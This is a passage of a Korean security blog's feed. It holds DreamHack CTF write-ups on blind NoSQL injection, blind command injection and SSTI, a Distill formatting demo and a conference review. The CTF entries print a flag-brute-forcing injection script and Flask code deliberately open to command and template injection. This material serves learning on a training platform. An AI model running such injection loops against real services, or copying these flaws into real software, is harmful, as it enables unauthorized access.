+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://host1.dreamhack.games:</span><span class="sh">'</span> <span class="o">+</span> <span class="n">port</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span><span class="n">params</span> <span class="o">=</span> <span class="n">params</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">req</span>
+
+<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+    <span class="k">global</span> <span class="nb">ascii</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">ascii</span><span class="p">:</span>
+        <span class="n">ch</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">[</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s">]</span><span class="sh">'</span>
+        <span class="k">if</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="ow">in</span> <span class="nf">url</span><span class="p">(</span><span class="n">ch</span><span class="p">).</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">[</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s">]</span><span class="sh">'</span>
+            <span class="k">break</span>
+    <span class="k">return</span> <span class="n">i</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[D]H{</span><span class="sh">'</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nf">search</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div> <h3 id="reference">Reference</h3> <p>[1] dreamhack. (2020).”Server-side Advanced - NoSQL.” Retrieved from https://dreamhack.io/learn/1/29#7</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[NoSQL은 RDMS와는 달리 쿼리문 없이도 데이터베이스에 저장된 데이터를 조작할 수 있는 개념이다. 본 문제에서는 NoSQL에 Blind injection을 수행하여 안에 저장된 데이터를 조회하도록 한다.]]></summary></entry><entry><title type="html">a distill-style blog post</title><link href="https://dalnaracrater.github.io/blog/2021/distill/" rel="alternate" type="text/html" title="a distill-style blog post"/><published>2021-05-22T00:00:00+00:00</published><updated>2021-05-22T00:00:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/distill</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/distill/"><![CDATA[<h2 id="equations">Equations</h2> <p>This theme supports rendering beautiful math in inline and display modes using <a href="https://www.mathjax.org/">MathJax 3</a> engine. You just need to surround your math expression with <code class="language-plaintext highlighter-rouge">$$</code>, like <code class="language-plaintext highlighter-rouge">$$ E = mc^2 $$</code>. If you leave it inside a paragraph, it will produce an inline expression, just like \(E = mc^2\).</p> <p>To use display mode, again surround your expression with <code class="language-plaintext highlighter-rouge">$$</code> and place it as a separate paragraph. Here is an example:</p> \[\left( \sum_{k=1}^n a_k b_k \right)^2 \leq \left( \sum_{k=1}^n a_k^2 \right) \left( \sum_{k=1}^n b_k^2 \right)\] <p>Note that MathJax 3 is <a href="https://docs.mathjax.org/en/latest/upgrading/whats-new-3.0.html">a major re-write of MathJax</a> that brought a significant improvement to the loading and rendering speed, which is now <a href="http://www.intmath.com/cg5/katex-mathjax-comparison.php">on par with KaTeX</a>.</p> <hr/> <h2 id="citations">Citations</h2> <p>Citations are then used in the article body with the <code class="language-plaintext highlighter-rouge">&lt;d-cite&gt;</code> tag. The key attribute is a reference to the id provided in the bibliography. The key attribute can take multiple ids, separated by commas.</p> <p>The citation is presented inline like this: <d-cite key="gregor2015draw"></d-cite> (a number that displays more information on hover). If you have an appendix, a bibliography is automatically created and populated in it.</p> <p>Distill chose a numerical inline citation style to improve readability of citation dense articles and because many of the benefits of longer citations are obviated by displaying more information on hover. However, we consider it good style to mention author last names if you discuss something at length and it fits into the flow well — the authors are human and it’s nice for them to have the community associate them with their work.</p> <hr/> <h2 id="footnotes">Footnotes</h2> <p>Just wrap the text you would like to show up in a footnote in a <code class="language-plaintext highlighter-rouge">&lt;d-footnote&gt;</code> tag. The number of the footnote will be automatically generated.<d-footnote>This will become a hoverable footnote.</d-footnote></p> <hr/> <h2 id="code-blocks">Code Blocks</h2> <p>Syntax highlighting is provided within <code class="language-plaintext highlighter-rouge">&lt;d-code&gt;</code> tags. An example of inline code snippets: <code class="language-plaintext highlighter-rouge">&lt;d-code language="html"&gt;let x = 10;&lt;/d-code&gt;</code>. For larger blocks of code, add a <code class="language-plaintext highlighter-rouge">block</code> attribute:</p> <d-code block="" language="javascript"> var x = 25; function(x) { return x * x; } </d-code> <p><strong>Note:</strong> <code class="language-plaintext highlighter-rouge">&lt;d-code&gt;</code> blocks do not look good in the dark mode. You can always use the default code-highlight using the <code class="language-plaintext highlighter-rouge">highlight</code> liquid tag:</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">25</span><span class="p">;</span>
+<span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">x</span> <span class="o">*</span> <span class="nx">x</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure> <hr/> <h2 id="interactive-plots">Interactive Plots</h2> <p>You can add interative plots using plotly + iframes :framed_picture:</p> <div class="l-page"> <iframe src="/assets/plotly/demo.html" frameborder="0" scrolling="no" height="500px" width="100%" style="border: 1px dashed grey;"></iframe> </div> <p>The plot must be generated separately and saved into an HTML file. To generate the plot that you see above, you can use the following code snippet:</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">pandas</span> <span class="k">as</span> <span class="n">pd</span>
+<span class="kn">import</span> <span class="n">plotly.express</span> <span class="k">as</span> <span class="n">px</span>
+<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="nf">read_csv</span><span class="p">(</span>
+  <span class="sh">'</span><span class="s">https://raw.githubusercontent.com/plotly/datasets/master/earthquakes-23k.csv</span><span class="sh">'</span>
+<span class="p">)</span>
+<span class="n">fig</span> <span class="o">=</span> <span class="n">px</span><span class="p">.</span><span class="nf">density_mapbox</span><span class="p">(</span>
+  <span class="n">df</span><span class="p">,</span>
+  <span class="n">lat</span><span class="o">=</span><span class="sh">'</span><span class="s">Latitude</span><span class="sh">'</span><span class="p">,</span>
+  <span class="n">lon</span><span class="o">=</span><span class="sh">'</span><span class="s">Longitude</span><span class="sh">'</span><span class="p">,</span>
+  <span class="n">z</span><span class="o">=</span><span class="sh">'</span><span class="s">Magnitude</span><span class="sh">'</span><span class="p">,</span>
+  <span class="n">radius</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+  <span class="n">center</span><span class="o">=</span><span class="nf">dict</span><span class="p">(</span><span class="n">lat</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">lon</span><span class="o">=</span><span class="mi">180</span><span class="p">),</span>
+  <span class="n">zoom</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+  <span class="n">mapbox_style</span><span class="o">=</span><span class="sh">"</span><span class="s">stamen-terrain</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">)</span>
+<span class="n">fig</span><span class="p">.</span><span class="nf">show</span><span class="p">()</span>
+<span class="n">fig</span><span class="p">.</span><span class="nf">write_html</span><span class="p">(</span><span class="sh">'</span><span class="s">assets/plotly/demo.html</span><span class="sh">'</span><span class="p">)</span></code></pre></figure> <hr/> <h2 id="details-boxes">Details boxes</h2> <p>Details boxes are collapsible boxes which hide additional information from the user. They can be added with the <code class="language-plaintext highlighter-rouge">details</code> liquid tag:</p> <details><summary>Click here to know more</summary> <p>Additional details, where math \(2x - 1\) and <code class="language-plaintext highlighter-rouge">code</code> is rendered correctly.</p> </details> <hr/> <h2 id="layouts">Layouts</h2> <p>The main text column is referred to as the body. It is the assumed layout of any direct descendants of the <code class="language-plaintext highlighter-rouge">d-article</code> element.</p> <div class="fake-img l-body"> <p>.l-body</p> </div> <p>For images you want to display a little larger, try <code class="language-plaintext highlighter-rouge">.l-page</code>:</p> <div class="fake-img l-page"> <p>.l-page</p> </div> <p>All of these have an outset variant if you want to poke out from the body text a little bit. For instance:</p> <div class="fake-img l-body-outset"> <p>.l-body-outset</p> </div> <div class="fake-img l-page-outset"> <p>.l-page-outset</p> </div> <p>Occasionally you’ll want to use the full browser width. For this, use <code class="language-plaintext highlighter-rouge">.l-screen</code>. You can also inset the element a little from the edge of the browser by using the inset variant.</p> <div class="fake-img l-screen"> <p>.l-screen</p> </div> <div class="fake-img l-screen-inset"> <p>.l-screen-inset</p> </div> <p>The final layout is for marginalia, asides, and footnotes. It does not interrupt the normal flow of <code class="language-plaintext highlighter-rouge">.l-body</code> sized text except on mobile screen sizes.</p> <div class="fake-img l-gutter"> <p>.l-gutter</p> </div> <hr/> <h2 id="other-typography">Other Typography?</h2> <p>Emphasis, aka italics, with <em>asterisks</em> (<code class="language-plaintext highlighter-rouge">*asterisks*</code>) or <em>underscores</em> (<code class="language-plaintext highlighter-rouge">_underscores_</code>).</p> <p>Strong emphasis, aka bold, with <strong>asterisks</strong> or <strong>underscores</strong>.</p> <p>Combined emphasis with <strong>asterisks and <em>underscores</em></strong>.</p> <p>Strikethrough uses two tildes. <del>Scratch this.</del></p> <ol> <li>First ordered list item</li> <li>Another item ⋅⋅* Unordered sub-list.</li> <li>Actual numbers don’t matter, just that it’s a number ⋅⋅1. Ordered sub-list</li> <li>And another item.</li> </ol> <p>⋅⋅⋅You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we’ll use three here to also align the raw Markdown).</p> <p>⋅⋅⋅To have a line break without a paragraph, you will need to use two trailing spaces.⋅⋅ ⋅⋅⋅Note that this line is separate, but within the same paragraph.⋅⋅ ⋅⋅⋅(This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</p> <ul> <li>Unordered list can use asterisks</li> <li>Or minuses</li> <li>Or pluses</li> </ul> <p><a href="https://www.google.com">I’m an inline-style link</a></p> <p><a href="https://www.google.com" title="Google's Homepage">I’m an inline-style link with title</a></p> <p><a href="https://www.mozilla.org">I’m a reference-style link</a></p> <p><a href="../blob/master/LICENSE">I’m a relative reference to a repository file</a></p> <p><a href="http://slashdot.org">You can use numbers for reference-style link definitions</a></p> <p>Or leave it empty and use the <a href="http://www.reddit.com">link text itself</a>.</p> <p>URLs and URLs in angle brackets will automatically get turned into links. http://www.example.com or <a href="http://www.example.com">http://www.example.com</a> and sometimes example.com (but not on Github, for example).</p> <p>Some text to show that the reference links can follow later.</p> <p>Here’s our logo (hover to see the title text):</p> <p>Inline-style: <img src="https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png" alt="alt text" title="Logo Title Text 1"/></p> <p>Reference-style: <img src="https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png" alt="alt text" title="Logo Title Text 2"/></p> <p>Inline <code class="language-plaintext highlighter-rouge">code</code> has <code class="language-plaintext highlighter-rouge">back-ticks around</code> it.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">JavaScript syntax highlighting</span><span class="dl">"</span><span class="p">;</span>
+<span class="nf">alert</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
+</code></pre></div></div> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Python syntax highlighting</span><span class="sh">"</span>
+<span class="k">print</span> <span class="n">s</span>
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>No language indicated, so no syntax highlighting.
+But let's throw in a &lt;b&gt;tag&lt;/b&gt;.
+</code></pre></div></div> <p>Colons can be used to align columns.</p> <table> <thead> <tr> <th>Tables</th> <th style="text-align: center">Are</th> <th style="text-align: right">Cool</th> </tr> </thead> <tbody> <tr> <td>col 3 is</td> <td style="text-align: center">right-aligned</td> <td style="text-align: right">$1600</td> </tr> <tr> <td>col 2 is</td> <td style="text-align: center">centered</td> <td style="text-align: right">$12</td> </tr> <tr> <td>zebra stripes</td> <td style="text-align: center">are neat</td> <td style="text-align: right">$1</td> </tr> </tbody> </table> <p>There must be at least 3 dashes separating each header cell. The outer pipes (|) are optional, and you don’t need to make the raw Markdown line up prettily. You can also use inline Markdown.</p> <table> <thead> <tr> <th>Markdown</th> <th>Less</th> <th>Pretty</th> </tr> </thead> <tbody> <tr> <td><em>Still</em></td> <td><code class="language-plaintext highlighter-rouge">renders</code></td> <td><strong>nicely</strong></td> </tr> <tr> <td>1</td> <td>2</td> <td>3</td> </tr> </tbody> </table> <blockquote> <p>Blockquotes are very handy in email to emulate reply text. This line is part of the same quote.</p> </blockquote> <p>Quote break.</p> <blockquote> <p>This is a very long line that will still be quoted properly when it wraps. Oh boy let’s keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can <em>put</em> <strong>Markdown</strong> into a blockquote.</p> </blockquote> <p>Here’s a line for us to start with.</p> <p>This line is separated from the one above by two newlines, so it will be a <em>separate paragraph</em>.</p> <p>This line is also a separate paragraph, but… This line is only separated by a single newline, so it’s a separate line in the <em>same paragraph</em>.</p>]]></content><author><name>Albert Einstein</name></author><category term="distill"/><category term="formatting"/><summary type="html"><![CDATA[an example of a distill-style blog post and main elements]]></summary></entry><entry><title type="html">(DreamHack) blind-command</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-blind-command/" rel="alternate" type="text/html" title="(DreamHack) blind-command"/><published>2021-04-06T09:24:00+00:00</published><updated>2021-04-06T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-blind-command</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-blind-command/"><![CDATA[<p>Blind command injection은 입력 값을 통해 os의 명령어를 실행시키는 취약점이다. 보통은 입력 값을 검증하고 (‘;’, ‘#’과 같은 값 포함 여부 검증), 사용자 계정 권한 설정을 통해 예방할 수 있다. 특히 root 권한은 부여하지 않도록 주의한다.</p> <h2 id="풀이">풀이</h2> <p>주어진 소스코드 에서는 GET 메소드를 통해 요청을 받으면 아무런 동작을 하지 않은 뒤 cmd를 반환한다. 그러나 GET 메소드가 아닌 경우에는 cmd에서 지정한 시스템 함수를 호출할 수 있다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">cmd</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">cmd</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">?cmd=[cmd]</span><span class="sh">"</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
+        <span class="sh">''</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cmd</span>
+
+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</code></pre></div></div> <p>먼저 로컬 호스트에서 HEAD 메소드를 사용하여 <code class="language-plaintext highlighter-rouge">host:port?cmd=dir</code>을 요청하게 되면 app.py 파일이 존재하는 디렉토리의 파일들을 출력하는 것을 콘솔창에서 확인할 수 있다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/113688584-6845cb80-9704-11eb-8938-3c095897e2fa.PNG" alt="ctf2-1"/></p> <p>그러나 주어진 컨테이너에서 플래그 값을 호출하지 못하였다. (어떻게 하는지 알려주세요ㅜㅜ)</p> <h3 id="http-메소드">HTTP 메소드</h3> <table> <thead> <tr> <th>name</th> <th>description</th> </tr> </thead> <tbody> <tr> <td>GET</td> <td>자료를 요청함</td> </tr> <tr> <td>HEAD</td> <td>GET 메소드 요청과 동일한 응답을 요구, body를 포함하지 않음</td> </tr> </tbody> </table> <h3 id="reference">Reference</h3> <p>[1] Heino Sass Hallik. (2020). “How to Prevent Blind Command Injection.” Retrieved from https://www.rangeforce.com/blog/how-to-prevent-blind-command-injection [2] MDN. (2021). “HTTP request methods.” Retrived from https://developer.mozilla.org/ko/docs/Web/HTTP/Methods</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[Blind command injection은 입력 값을 통해 os의 명령어를 실행시키는 취약점이다. 보통은 입력 값을 검증하고 (‘;’, ‘#’과 같은 값 포함 여부 검증), 사용자 계정 권한 설정을 통해 예방할 수 있다. 특히 root 권한은 부여하지 않도록 주의한다.]]></summary></entry><entry><title type="html">(DreamHack) simple-ssti</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-simple-ssti/" rel="alternate" type="text/html" title="(DreamHack) simple-ssti"/><published>2021-04-06T09:24:00+00:00</published><updated>2021-04-06T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-simple-ssti</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-simple-ssti/"><![CDATA[<p>SSTI (Server Side Template Injection) 취약점은 동적으로 생성되는 웹페이지의 특성으로 인해 발생하는 취약점으로써 템플릿에 RCE (Remote Code Execution)가 존재할 경우 발생되는 취약점이다.</p> <h2 id="풀이">풀이</h2> <p>flag.txt에 저장된 값은 FLAG와 app.secret_key에 저장된다. 그러나 FLAG는 전역변수가 아니기 때문에 Error404 메소드에서 사용할 수 없다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
+    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[**FLAG**]</span><span class="sh">'</span>
+
+<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">FLAG</span>
+</code></pre></div></div> <p>그러나 flask는 Flask 객체의 config 속성에 애플리케이션의 실행 환경에 대한 설정 값을 저장한다. 그렇기 때문에 FLAG 값 또한 config에 설정이 되어 있다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">Error404</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
+    <span class="n">template</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+    &lt;div class=</span><span class="sh">"</span><span class="s">center</span><span class="sh">"</span><span class="s">&gt;
+        &lt;h1&gt;Page Not Found.&lt;/h1&gt;
+        &lt;h3&gt;%s&lt;/h3&gt;
+    &lt;/div&gt;
+</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">),</span> <span class="mi">404</span>
+
+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">%s</code>를 통해 ssti 취약점이 발생될 수 있다. 따라서 config를 출력하도록 <code class="language-plaintext highlighter-rouge">host:port/</code>를 요청하면 다음과 같이 플래그 값을 얻을 수 있다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/113693098-35520680-9709-11eb-94b1-eb0910fc6c2f.png" alt="image"/></p> <h3 id="reference">Reference</h3> <p>[1] Armin Ronacher. (2012).”설정 다루기.” Retrieved from https://flask-docs-kr.readthedocs.io/ko/latest/config.html</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[SSTI (Server Side Template Injection) 취약점은 동적으로 생성되는 웹페이지의 특성으로 인해 발생하는 취약점으로써 템플릿에 RCE (Remote Code Execution)가 존재할 경우 발생되는 취약점이다.]]></summary></entry><entry><title type="html">SDS Cyber Security Conference 2021 후기</title><link href="https://dalnaracrater.github.io/blog/2021/SDS-Cyber_Security-Conference/" rel="alternate" type="text/html" title="SDS Cyber Security Conference 2021 후기"/><published>2021-04-06T06:24:00+00:00</published><updated>2021-04-06T06:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/SDS-Cyber_Security-Conference</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/SDS-Cyber_Security-Conference/"><![CDATA[<h2 id="간단한-후기">간단한 후기</h2> <p>Samsung SDS에서 Cyber Security Conference 2021을 개최하였다. 컨퍼런스에서는 최근 보안 동향과 기술들을 다루고 있었다. 특히 COVID-19사태를 맞이한 지금, SDS가 어떻게 보안 솔루션을 제공하고 있는지에 대한 내용들이 주를 이루었다. 산업에서 현재 다루고 있는 보안 동향에 대해 알 수 있는 좋은 기회였다. 다만 컨퍼런스가 쉬는 시간 없이 빡빡하게 진행되는 점이 아쉬웠다.</p> <h3 id="zero-trust-network">Zero Trust Network</h3> <p>일반적으로 네트워크의 경계부분만 관리하면 된다는 전통적인 생각이 만연하다고 한다. 하지만 더 이상 이러한 생각은 통하지 않기 때문에 <strong>Zero trust 보안</strong>에 대해서 고려해야 한다.<br/> Zero trust는 사용자부터, 디바이스, 네트워크 등 보안이 고려될 수 있는 모든 요소를 고려함으로써 아무것도 신뢰하지 않는 (Zero trust) 보안 접근 방식을 말한다.</p> <p>원격 근무 환경에서의 계정 보안 강화를 위해 완충지대를 두고 접근 제어를 해야하기 때문에 로깅이 필요하다.</p> <ul> <li>이상 감지 엔진 (유저 행위, 단말 정보, 인증 통신)</li> </ul> <p>보통 원격접속, SSL VPN 등을 통해 원격 근무 환경을 조성한다. 그렇다면 업무 지연은 없을까?<br/> 방화벽정책을 적용하는 등에 시간이 소요되면 <strong>업무의 연속성</strong>을 침해하게 된다.</p> <ul> <li>신원 확인 w/ MFA</li> <li>디바이스 신뢰성 확인 <ul> <li>악성코드 확인 / 차등화된 접근 레벨 설정</li> </ul> </li> <li>최소 접근 권한 관리</li> </ul> <p>금감원, 재택근무 가이드</p> <ul> <li>외부 단말기 보안</li> <li>인증 및 통신 회선: MFA</li> <li>내부망 접근 통제</li> </ul> <h3 id="endpoint-detection-and-response-edr">Endpoint Detection and Response (EDR)</h3> <p>pre, post 시점에 대해서는 사전에 잘 예방하고, 사후 보완을 하는 것은 큰 문제가 없다고 한다. 그러나 peri (현재)는 다르며, 매우 중요하다고 하였다 (very critical).</p> <p>automatic response happens</p> <ul> <li>automation (자동화)</li> <li>autonomy (자율성)</li> <li>Correlation (연관성)</li> <li>End-to-End Integreted Processes</li> <li>One Platform</li> <li>SOC Empowerment</li> </ul> <h3 id="딥페이크-탐지">딥페이크 탐지</h3> <p>딥페이크를 탐지하기 위해 생리적 특징, 이미지, 주파수 정보를 이용한다고 한다. SDS의 경우에는 주파수 기반의 탐지 기법을 사용하고 있으며 99.99%이상의 성능을 보인다고 하였다.<br/> 또한 어느 한 로이터 기자의 인터뷰에 따르면 실제로 무엇을 분석하려고 하는지 알기만 하면 딥페이크가 적용된 영상을 탐지하는 것은 쉬울 것이라고 하였다.</p> <h3 id="기타-주제들">기타 주제들</h3> <ul> <li>On premis에서 Cloud로의 변화</li> <li>가상환경을 이용한 버그바운티</li> <li>동형암호</li> </ul> <h2 id="q--a">Q &amp; A</h2> <p>Q. 그렇다면 IT보안 체계가 여러개 필요하다고 했는데 그렇다면 디지털 관련 속도나 리소스가 상당히 들어갈 가능성 있는데, 이 부분의 효율성은 어떻게 살려야 할까요?<br/> A. 가능한 유사기능은 통합을 고려하는 것이 좋을 것 같습니다. 그리고, 최근에 SOAR 등과 같이 복합한 보안체계에 대한 통합 및 자동화를 지원하는 솔루션들도 나오고 있어서 도입을 고려하시는 것도 방안일 것 같습니다.</p> <p>Q. 정보유출 관점에서 스마트폰 등 외부기기를 통한 화면촬영에 대한 보안책도 있는지요?<br/> A. 물리적인 화면을 보호하기 위해서는 특정장소에서 휴대기기의 기능을 통제하는 MDM을 도입하거나 물리적 통제(반입금지 등)이 수단이 될 것 같습니다.)</p> <p>Q. 최근 카카오웍크도 클라우드기반의 외부 플랫폼도 활용하고 있는데요, 외부 연계 플랫폼으로 들어오는 관리 사례가 있을까요?<br/> A. 네, 요새 Cloud SaaS에 대한 연계가 필수적인데요, Workday 등 다수 Cloud SaaS 앱과도 연계가 가능합니다. (Saml, OIDC 등 활용)</p> <p>Q. 솔라윈즈와 같은 사고를 예방하는 방법이 제로트러스트란 뜻인지요? 제로트러스트란 무엇인지 제로트러스트 구축을 위해 기업이 고민해야 할 사항은 무엇인지 설명 부탁드립니다.<br/> A. 제로트러스트라는 것은 그 누구도 믿지 말라는 뜻입니다. 이를 위해서는 접근통제에 대한 강화와, 접근된 이후 감사로그에 대한 분석/모니터링을 통한 유기적인 사후대응이 포함되어야 합니다. 또한 이러한 부분이 사용성에 지장으로 다가가지 않도록 편의성에 대한 부분도 고려되야 합니다.</p> <p>Q. 일반적으로 사전 탐지가 어려운것으로 알고 있습니다. 사전 탐지를 위한 요건들은 어떤것들이 있는지요?<br/> A. 사전탐지에 대한 부분은 일단은 공격에 대한 축적된 지식을 기반으로 한 시나리오로 선제대응을 해야 하며, 이후에 지속적인 지식화 작업으로 사전탐지 대응력을 높여가야 합니다.</p> <p>Q. 차세대방화벽에서 암호화된 트래픽에 대한 탐지/차단은 어떤식으로 가능한지 궁금합니다.<br/> A. 암호화트래픽(SSL)에 대한 복호화 처리 기능이 있어서 방화벽에서 이를 복호화하여 보안처리 후, 다시 암호화 처리하여 전송을 하여 줍니다.</p> <h2 id="마무리">마무리</h2> <p>국내 보안 컨퍼런스는 이번이 두번째인데 비록 회사의 보안 제품을 홍보하는 내용이 마지막에 많이 나와 아쉬웠지만 최근 보안 동향도 알고, 산업에서 중요시 하는 보안 요소들을 알 수 있어 좋았다.</p>]]></content><author><name></name></author><category term="Conference"/><category term="Security"/><summary type="html"><![CDATA[간단한 후기]]></summary></entry></feed>
